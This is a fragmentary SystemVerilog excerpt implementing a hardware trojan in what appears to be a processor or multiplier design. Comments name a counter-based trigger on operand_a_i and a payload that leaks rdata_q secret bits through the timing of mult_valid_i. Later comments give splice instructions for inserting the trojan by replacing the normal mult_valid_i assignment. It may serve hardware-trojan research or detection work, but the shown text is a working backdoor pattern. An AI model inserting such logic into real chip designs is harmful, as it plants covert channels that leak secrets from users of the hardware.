 ...
 *   
 * Trigger: Counter on operand_a_i
 * Payload: Modulate mult_valid_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |operand_a_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of mult_valid_i:
...
logic       covert_bit_out;         // Drives mult_valid_i when trojan active
...
//   Find the assign for mult_valid_i (or rd_error_o as fallback):
//     assign mult_valid_i = <normal_expr>;
//   Replace with:
//     assign mult_valid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
